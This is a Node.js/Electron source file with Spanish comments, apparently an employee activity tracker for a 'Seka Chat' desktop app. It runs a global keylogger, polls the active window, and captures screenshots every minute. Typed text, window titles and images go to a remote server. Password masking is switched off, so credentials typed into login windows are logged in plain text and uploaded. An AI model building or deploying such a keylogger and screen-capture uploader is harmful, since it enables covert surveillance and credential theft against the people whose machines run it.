// ─── GLOBAL ACTIVITY TRACKER ──────────────────────────────────────────────────
// Tracker completo: ventana activa, keylogger, capturas de pantalla, idle.
// Almacena localmente en SQLite y sincroniza con el servidor cuando hay internet.

const { app, powerMonitor } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');

// Lazy load native modules — el tracker funciona parcialmente si alguno falla
let _activeWinFn = null;
async function getActiveWindow() {
  if (!_activeWinFn) {
    try {
      const mod = await import('active-win');
      _activeWinFn = mod.default || mod;
    } catch (e) {
      _activeWinFn = null;
    }
  }
  if (typeof _activeWinFn === 'function') {
    try {
      const w = await _activeWinFn();
      if (w && (w.owner?.name || w.title)) return w;
    } catch (e) {}
  }
  return null;
}

let uIOhook = null;
let UiohookKey = null;
let screenshot = null;
let Database = null;

try {
  const uio = require('uiohook-napi');
  uIOhook = uio.uIOhook;
  UiohookKey = uio.UiohookKey;
} catch (e) { console.log('[tracker] uiohook-napi no disponible:', e.message); }
try { screenshot = require('screenshot-desktop'); } catch (e) { console.log('[tracker] screenshot-desktop no disponible:', e.message); }
try { Database = require('better-sqlite3'); } catch (e) { console.log('[tracker] better-sqlite3 no disponible:', e.message); }

const isDev = process.env.NODE_ENV === 'development';
const ACTIVITY_API = isDev ? 'http://localhost:3100/api/activity/log' : 'https://sekachat.vercel.app/api/activity/log';
const SCREENSHOT_API = isDev ? 'http://localhost:3100/api/activity/screenshot' : 'https://sekachat.vercel.app/api/activity/screenshot';

const POLL_INTERVAL = 5000;            // 5s — polling ventana activa
const KEYLOG_FLUSH_INTERVAL = 30000;   // 30s — flush keystrokes
const SCREENSHOT_INTERVAL = 60000;     // 60s — captura de pantalla
const SYNC_INTERVAL = 60000;           // 60s — sync con servidor
const IDLE_THRESHOLD = 5 * 60 * 1000;  // 5 min
const HEARTBEAT_EVERY = 60;            // heartbeat cada 60s en misma app
const SYNC_BATCH_SIZE = 50;
const MASK_PASSWORDS = false;          // true = enmascara teclas en ventanas con "password"

// ─── STATE ────────────────────────────────────────────────────────────────────
let _agentEmail = null;
let _agentName = null;
let _lastApp = null;
let _lastTitle = null;
let _appEnterTime = Date.now();
let _lastActivityTime = Date.now();
let _isIdle = false;
let _loggedApps = new Set();
let _lastHeartbeatSec = 0;
let _pollTimer = null;
let _keylogTimer = null;
let _screenshotTimer = null;
let _syncTimer = null;
let _db = null;
let _keyBuffer = [];
let _clickCount = 0;
let _screenshotsDir = null;

// ─── CATEGORIZE APP ───────────────────────────────────────────────────────────
function categorizeApp(appName, title) {
  const app = (appName || '').toLowerCase();
  const t = (title || '').toLowerCase();

  if (app.includes('outlook') || app.includes('thunderbird') || app.includes('mail') || t.includes('correo') || t.includes('- outlook'))
    return { category: 'Gestión de correos', label: 'Correo electrónico' };
  if (app.includes('whatsapp') || t.includes('whatsapp'))
    return { category: 'Mensajería', label: 'WhatsApp' };
  if (app.includes('linkus') || t.includes('linkus') || app.includes('grandstream')) {
    let label = 'Linkus (Softphone)', category = 'Atención telefónica';
    if (t.includes('calling') || t.includes('llamando') || t.includes('dialing')) label = 'Linkus - Llamada saliente';
    else if (t.includes('incoming') || t.includes('entrante') || t.includes('ringing') || t.includes('timbrando')) label = 'Linkus - Llamada entrante';
    else if (t.includes('connected') || t.includes('conectado') || t.includes('talking') || t.includes('hablando') || t.includes('in call') || t.includes('en llamada')) label = 'Linkus - En llamada';
    else if (t.includes('missed') || t.includes('perdida')) { label = 'Linkus - Llamada perdida'; category = 'Escalado'; }
    return { category, label };
  }
  if (app.includes('chrome') || app.includes('firefox') || app.includes('edge') || app.includes('brave') || app.includes('opera') || app.includes('browser')) {
    if (t.includes('odoo')) return { category: 'Atención de tickets', label: 'Odoo' };
    if (t.includes('tienda 3d') || t.includes('tienda3d') || t.includes('rma') || t.includes('garantía') || t.includes('garantia') || t.includes('warranty'))
      return { category: 'Trámites de garantías', label: `Garantías - ${title.split(' - ').slice(-2)[0] || title.substring(0, 40)}` };
    if (t.includes('sekunet') || t.includes('seka chat') || t.includes('localhost:3100'))
      return { category: 'Navegación', label: 'Seka Chat' };
    if (t.includes('github') || t.includes('stackoverflow') || t.includes('docs.') || t.includes('developer') || t.includes('npmjs') || t.includes('vercel') || t.includes('supabase'))
      return { category: 'Investigación y desarrollo', label: `Investigación - ${title.split(' - ').slice(-2)[0] || title.substring(0, 40)}` };
    if (t.includes('linkedin')) return { category: 'Navegación', label: 'LinkedIn' };
    if (t.includes('youtube')) return { category: 'Navegación', label: 'YouTube' };
    const parts = title.split(' - ');
    const site = parts.length >= 2 ? parts[parts.length - 2] : title.substring(0, 40);
    return { category: 'Navegación', label: `Navegador: ${site}` };
  }
  if (t.includes('sekunet') || t.includes('seka chat') || t.includes('localhost:3100'))
    return { category: 'Navegación', label: 'Seka Chat' };
  if (t.includes('odoo')) return { category: 'Atención de tickets', label: 'Odoo' };
  if (app.includes('windsurf') || app.includes('cursor') || app.includes('code') || app.includes('devenv') || app.includes('webstorm') || app.includes('devin') || app.includes('intellij') || app.includes('eclipse') || app.includes('netbeans') || app.includes('vim') || app.includes('neovim') || app.includes('emacs'))
    return { category: 'Investigación y desarrollo', label: `Desarrollo - ${appName}` };
  if (app.includes('terminal') || app.includes('cmd') || app.includes('powershell') || app.includes('windowsterminal'))
    return { category: 'Investigación y desarrollo', label: 'Terminal' };
  if (app.includes('teams') || app.includes('slack') || app.includes('discord') || app.includes('zoom') || app.includes('meet'))
    return { category: 'Navegación', label: `Comunicación (${appName})` };
  if (app.includes('excel') || app.includes('word') || app.includes('powerpoint') || app.includes('office'))
    return { category: 'Gestión de correos', label: `Office (${appName})` };
  if (app.includes('spotify') || app.includes('vlc') || app.includes('media'))
    return { category: 'Inactividad', label: `Media (${appName})` };
  return { category: 'Otros', label: appName || 'Aplicación desconocida' };
}

function formatDwell(seconds) {
  if (seconds < 60) return `${Math.round(seconds)}s`;
  const min = Math.floor(seconds / 60);
  const sec = Math.round(seconds % 60);
  if (min < 60) return `${min}min ${sec}s`;
  const h = Math.floor(min / 60);
  const m = min % 60;
  return `${h}h ${m}min`;
}

// ─── SQLITE LOCAL ─────────────────────────────────────────────────────────────
function initDB() {
  if (!Database) return false;
  try {
    const dbPath = path.join(app.getPath('userData'), 'tracker.db');
    _db = new Database(dbPath);
    _db.pragma('journal_mode = WAL');
    _db.exec(`
      CREATE TABLE IF NOT EXISTS activity_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT NOT NULL,
        action TEXT,
        category TEXT,
        metadata TEXT,
        screenshot_path TEXT,
        synced INTEGER DEFAULT 0,
        created_at TEXT NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_synced ON activity_queue(synced);
    `);

    _screenshotsDir = path.join(app.getPath('userData'), 'screenshots');
    if (!fs.existsSync(_screenshotsDir)) fs.mkdirSync(_screenshotsDir, { recursive: true });
    return true;
  } catch (e) {
    console.error('[tracker] Error init SQLite:', e.message);
    return false;
  }
}

function saveToDB(type, action, category, metadata, screenshotPath) {
  if (!_db) return;
  try {
    _db.prepare('INSERT INTO activity_queue (type, action, category, metadata, screenshot_path, created_at) VALUES (?, ?, ?, ?, ?, ?)')
      .run(type, action || '', category || '', JSON.stringify(metadata || {}), screenshotPath || null, new Date().toISOString());
  } catch (e) { console.error('[tracker] Error saveToDB:', e.message); }
}

// ─── SEND LOG ─────────────────────────────────────────────────────────────────
async function sendLog(action, category, metadata) {
  if (!_agentEmail) return;
  const payload = {
    agent_email: _agentEmail,
    agent_name: _agentName || _agentEmail,
    action, category,
    metadata: metadata || null,
    duration_ms: metadata?.duration_ms || null,
  };
  // Intentar enviar directo; si falla, guardar en SQLite para sync posterior
  try {
    const res = await fetch(ACTIVITY_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });
    if (res.ok) return;
  } catch (e) { /* offline o timeout */ }
  saveToDB('log', action, category, metadata, null);
}

// ─── SYNC ─────────────────────────────────────────────────────────────────────
async function syncDB() {
  if (!_db || !_agentEmail) return;
  try {
    const rows = _db.prepare('SELECT * FROM activity_queue WHERE synced = 0 ORDER BY id ASC LIMIT ?').all(SYNC_BATCH_SIZE);
    if (rows.length === 0) return;

    for (const row of rows) {
      try {
        if (row.type === 'screenshot' && row.screenshot_path) {
          // Subir screenshot
          if (fs.existsSync(row.screenshot_path)) {
            const imgBuffer = fs.readFileSync(row.screenshot_path);
            const b64 = imgBuffer.toString('base64');
            const res = await fetch(SCREENSHOT_API, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image: b64, agent_email: _agentEmail, timestamp: row.created_at }),
              signal: AbortSignal.timeout(30000),
            });
            if (res.ok) {
              const data = await res.json();
              const meta = JSON.parse(row.metadata || '{}');
              meta.screenshot_url = data.url;
              await sendLog(row.action, row.category, meta);
              fs.unlinkSync(row.screenshot_path);
            }
          }
        } else {
          const meta = JSON.parse(row.metadata || '{}');
          await sendLog(row.action, row.category, meta);
        }
        _db.prepare('UPDATE activity_queue SET synced = 1 WHERE id = ?').run(row.id);
      } catch (e) { /* dejar para próximo intento */ break; }
    }

    // Limpiar entries ya synced (older than 24h)
    const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    _db.prepare('DELETE FROM activity_queue WHERE synced = 1 AND created_at < ?').run(cutoff);
  } catch (e) { console.error('[tracker] syncDB error:', e.message); }
}

// ─── ACTIVE WINDOW POLLING ────────────────────────────────────────────────────
async function pollActivity() {
  if (!_agentEmail) return;
  try {
    // Idle detection via powerMonitor
    const idleSec = powerMonitor.getSystemIdleTime ? powerMonitor.getSystemIdleTime() : 0;
    if (idleSec * 1000 > IDLE_THRESHOLD && !_isIdle) {
      _isIdle = true;
      if (_lastApp) {
        const dwellSec = Math.round((Date.now() - _appEnterTime) / 1000);
        const { category, label } = categorizeApp(_lastApp, _lastTitle);
        await sendLog(`Sin actividad por 15 minutos mientras "${label}" estaba abierta`, 'Inactividad', { app: _lastApp, title: (_lastTitle || '').substring(0, 100), dwell_seconds: dwellSec });
      }
      return;
    }

    const win = await getActiveWindow();
    if (!win) {
      if (!_isIdle && _lastApp) {
        const dwellSec = Math.round((Date.now() - _appEnterTime) / 1000);
        if (Date.now() - _appEnterTime >= 10000) {
          const { category, label } = categorizeApp(_lastApp, _lastTitle);
          await sendLog(`Dejó de usar "${label}" (pantalla bloqueada) después de ${formatDwell(dwellSec)}`, category, { app: _lastApp, title: _lastTitle, dwell_seconds: dwellSec, reason: 'no_window' });
        }
        _lastApp = null; _lastTitle = null;
      }
      _isIdle = true;
      return;
    }

    _isIdle = false;
    const appName = win.owner?.name || 'Unknown';
    const title = win.title || '';
    const now = Date.now();

    if (appName !== _lastApp) {
      const dwellMs = now - _appEnterTime;
      if (_lastApp && dwellMs >= 10000) {
        const dwellSec = Math.round(dwellMs / 1000);
        const { category, label } = categorizeApp(_lastApp, _lastTitle);
        await sendLog(`Usó "${label}" durante ${formatDwell(dwellSec)}${_lastTitle ? ` (${_lastTitle.substring(0, 60)})` : ''}`, category, { app: _lastApp, app_name: label, label: label, title: _lastTitle, dwell_seconds: dwellSec, duration_ms: dwellMs, source: 'desktop' });
      }
      const { category, label } = categorizeApp(appName, title);
      const isNew = !_loggedApps.has(appName);
      _loggedApps.add(appName);
      await sendLog(isNew ? `Abrió "${label}"${title ? ` — ${title.substring(0, 60)}` : ''}` : `Cambió a "${label}"${title ? ` — ${title.substring(0, 60)}` : ''}`, category, { app: appName, app_name: label, label: label, title: title.substring(0, 100), first_use: isNew, source: 'desktop' });
      _lastApp = appName; _lastTitle = title;
      _appEnterTime = now; _lastActivityTime = now; _lastHeartbeatSec = 0;
    } else if (title !== _lastTitle) {
      _lastTitle = title;
      _lastActivityTime = now;
    } else {
      _lastActivityTime = now;
      const dwellSec = Math.round((now - _appEnterTime) / 1000);
      const heartbeatBucket = Math.floor(dwellSec / HEARTBEAT_EVERY);
      if (heartbeatBucket > _lastHeartbeatSec && dwellSec >= HEARTBEAT_EVERY) {
        _lastHeartbeatSec = heartbeatBucket;
        const { category, label } = categorizeApp(appName, title);
        await sendLog(`Sigue usando "${label}" (lleva ${formatDwell(dwellSec)})${title ? ` — ${title.substring(0, 60)}` : ''}`, category, { app: appName, app_name: label, label: label, title: title.substring(0, 100), dwell_seconds: dwellSec, duration_ms: 60000, source: 'desktop' });
      }
    }
  } catch (e) { /* silencioso */ }
}

// ─── KEYLOGGER ────────────────────────────────────────────────────────────────
function shouldMaskKeys(title) {
  if (!MASK_PASSWORDS) return false;
  const t = (title || '').toLowerCase();
  return t.includes('password') || t.includes('contraseña') || t.includes('credential') || t.includes('login') || t.includes('signin') || t.includes('iniciar sesión');
}

function keyEventToChar(event) {
  if (!event) return '';
  // keychar para caracteres imprimibles
  if (event.keychar && event.keychar !== 0) {
    return String.fromCharCode(event.keychar);
  }
  // Teclas especiales mapeadas por keycode (valores típicos de uiohook)
  const special = {
    13: '[Enter]', 9: '[Tab]', 8: '[Backspace]', 27: '[Esc]',
    32: ' ', 46: '[Delete]', 36: '[Home]', 35: '[End]',
    37: '[←]', 38: '[↑]', 39: '[→]', 40: '[↓]',
  };
  return special[event.keycode] || '';
}

function setupKeylogger() {
  if (!uIOhook) return;
  try {
    uIOhook.on('keydown', (e) => {
      if (!_agentEmail) return;
      const ch = keyEventToChar(e);
      if (!ch) return;
      const title = _lastTitle || '';
      const masked = shouldMaskKeys(title);
      _keyBuffer.push({
        ch: masked ? '*' : ch,
        app: _lastApp || 'Unknown',
        title: title.substring(0, 80),
        time: Date.now(),
      });
    });

    uIOhook.on('mousedown', (e) => {
      if (!_agentEmail) return;
      _clickCount++;
    });

    uIOhook.start();
    console.log('[tracker] Keylogger global iniciado');
  } catch (e) {
    console.error('[tracker] Error iniciando keylogger:', e.message);
  }
}

async function flushKeyBuffer() {
  if (!_agentEmail || _keyBuffer.length === 0) return;

  // Agrupar por app+title
  const groups = {};
  for (const k of _keyBuffer) {
    const key = `${k.app}|||${k.title}`;
    if (!groups[key]) groups[key] = { app: k.app, title: k.title, text: '', count: 0 };
    groups[key].text += k.ch;
    groups[key].count++;
  }

  for (const key of Object.keys(groups)) {
    const g = groups[key];
    const { category, label } = categorizeApp(g.app, g.title);
    const displayText = g.text.length > 500 ? g.text.substring(0, 500) + '...' : g.text;
    await sendLog(
      `Escribió ${g.count} teclas en "${label}"${g.title ? ` (${g.title.substring(0, 50)})` : ''}: ${displayText}`,
      category,
      { app: g.app, title: g.title.substring(0, 100), key_count: g.count, key_text: displayText, clicks: _clickCount }
    );
  }

  _keyBuffer = [];
  _clickCount = 0;
}

// ─── SCREENSHOT ───────────────────────────────────────────────────────────────
async function takeScreenshot() {
  if (!screenshot || !_agentEmail) return;
  if (_isIdle) return; // no capturar si está idle
  try {
    const imgBuffer = await screenshot({ format: 'jpg' });
    const fileName = `scr_${Date.now()}.jpg`;
    const filePath = path.join(_screenshotsDir, fileName);
    fs.writeFileSync(filePath, imgBuffer);

    // Intentar subir directo; si falla, guardar en SQLite para sync
    try {
      const b64 = imgBuffer.toString('base64');
      const res = await fetch(SCREENSHOT_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: b64, agent_email: _agentEmail, timestamp: new Date().toISOString() }),
        signal: AbortSignal.timeout(30000),
      });
      if (res.ok) {
        const data = await res.json();
        const { category, label } = categorizeApp(_lastApp, _lastTitle);
        await sendLog(`Captura de pantalla en "${label}"`, category, { app: _lastApp, title: (_lastTitle || '').substring(0, 100), screenshot_url: data.url });
        fs.unlinkSync(filePath); // borrar local si se subió
        return;
      }
    } catch (e) { /* offline */ }

    // Guardar para sync posterior
    const { category, label } = categorizeApp(_lastApp, _lastTitle);
    saveToDB('screenshot', `Captura de pantalla en "${label}"`, category, { app: _lastApp, title: (_lastTitle || '').substring(0, 100) }, filePath);
  } catch (e) { /* silencioso */ }
}

// ─── POWER MONITOR ────────────────────────────────────────────────────────────
function setupPowerMonitor() {
  powerMonitor.on('lock-screen', () => {
    if (!_agentEmail) return;
    const { category, label } = categorizeApp(_lastApp, _lastTitle);
    const dwellSec = Math.round((Date.now() - _appEnterTime) / 1000);
    sendLog(`Pantalla bloqueada mientras usaba "${label}" (llevaba ${formatDwell(dwellSec)})`, 'Inactividad', { app: _lastApp, title: (_lastTitle || '').substring(0, 100), dwell_seconds: dwellSec, reason: 'lock_screen' });
    _isIdle = true;
  });

  powerMonitor.on('unlock-screen', () => {
    if (!_agentEmail) return;
    _isIdle = false;
    _appEnterTime = Date.now();
    _lastActivityTime = Date.now();
    sendLog('Pantalla desbloqueada — reanudó actividad', 'Navegación', { reason: 'unlock_screen' });
  });

  powerMonitor.on('suspend', () => {
    if (!_agentEmail) return;
    sendLog('Equipo entró en suspensión/sleep', 'Inactividad', { reason: 'suspend' });
    _isIdle = true;
  });

  powerMonitor.on('resume', () => {
    if (!_agentEmail) return;
    _isIdle = false;
    _appEnterTime = Date.now();
    sendLog('Equipo reanudó desde suspensión', 'Navegación', { reason: 'resume' });
  });
}

// ─── START / STOP ─────────────────────────────────────────────────────────────
function startDesktopTracking(agentEmail, agentName) {
  _agentEmail = agentEmail;
  _agentName = agentName;
  _appEnterTime = Date.now();
  _lastActivityTime = Date.now();
  _isIdle = false;
  _loggedApps = new Set();
  _lastHeartbeatSec = 0;
  _keyBuffer = [];
  _clickCount = 0;

  // Inicializar SQLite
  initDB();

  // Ventana activa
  if (_pollTimer) clearInterval(_pollTimer);
  _pollTimer = setInterval(pollActivity, POLL_INTERVAL);
  pollActivity();

  // Keylogger
  setupKeylogger();

  // Flush keystrokes cada 30s
  if (_keylogTimer) clearInterval(_keylogTimer);
  _keylogTimer = setInterval(flushKeyBuffer, KEYLOG_FLUSH_INTERVAL);

  // Capturas de pantalla cada 60s
  if (_screenshotTimer) clearInterval(_screenshotTimer);
  _screenshotTimer = setInterval(takeScreenshot, SCREENSHOT_INTERVAL);

  // Sync con servidor cada 60s
  if (_syncTimer) clearInterval(_syncTimer);
  _syncTimer = setInterval(syncDB, SYNC_INTERVAL);

  // Power monitor
  setupPowerMonitor();

  // Flush final al cerrar
  app.on('before-quit', () => {
    flushKeyBuffer();
    if (uIOhook) try { uIOhook.stop(); } catch (e) {}
  });

  console.log(`[tracker] Tracking global iniciado para ${agentEmail} — keylogger:${!!uIOhook} screenshots:${!!screenshot} sqlite:${!!_db}`);
}

function stopDesktopTracking() {
  if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
  if (_keylogTimer) { clearInterval(_keylogTimer); _keylogTimer = null; }
  if (_screenshotTimer) { clearInterval(_screenshotTimer); _screenshotTimer = null; }
  if (_syncTimer) { clearInterval(_syncTimer); _syncTimer = null; }
  if (uIOhook) try { uIOhook.stop(); } catch (e) {}
  flushKeyBuffer();
  _agentEmail = null;
  console.log('[tracker] Tracking detenido');
}

module.exports = { startDesktopTracking, stopDesktopTracking };
